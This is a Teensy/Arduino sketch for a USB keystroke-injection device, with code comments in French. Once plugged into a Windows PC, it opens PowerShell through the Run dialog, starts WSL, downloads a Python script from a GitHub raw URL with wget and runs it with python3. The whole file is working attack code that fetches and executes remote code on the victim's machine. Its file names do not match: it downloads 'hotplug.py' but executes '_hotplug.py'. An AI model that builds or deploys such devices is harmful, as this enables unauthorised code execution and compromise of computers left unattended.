#include <usb_keyboard.h>

int ds = 500;

#if defined(CORE_TEENSY)
#define LED_PIN 13
#endif 

#include <Keyboard.h>

void downloadPythonScript()
{
  // Ecrire la commande wsl
  delay(2000);
  Keyboard.print("wsl");

  // Envoyer la commande wsl et ramener la key à 0
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();  
  Keyboard.set_key1(0);
  Keyboard.send_now();
  
  // Ecrire la commande ls
  delay(2000);
  Keyboard.print("wget https://raw.githubusercontent.com/");
  delay(700);
  Keyboard.print("loictossou2004/Hot-Plug/main/hotplug.py");
  
  // Envoyer la commande ls et ramener la key à 0
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  Keyboard.set_key1(0);
  Keyboard.send_now();

}

void executeHotplug()
{
  delay(1000);
  Keyboard.print("python3 _hotplug.py");
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  Keyboard.set_key1(0);
  Keyboard.send_now();
}

void setup()
{
  // allow controlling LED
  pinMode(LED_PIN, OUTPUT);
  // turn the LED on while running
  digitalWrite(LED_PIN, HIGH);

  delay(5000);
    
  Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
  Keyboard.set_key1(KEY_R);
  Keyboard.send_now();
    
  delay(500);
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  Keyboard.print("powershell.exe");
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  Keyboard.set_key1(0);
  Keyboard.send_now();


  downloadPythonScript();
  executeHotplug();

}

void loop()
{
  digitalWrite(LED_PIN, HIGH);
  delay(ds/2);
  digitalWrite(LED_PIN, LOW);
  delay(ds/2);
}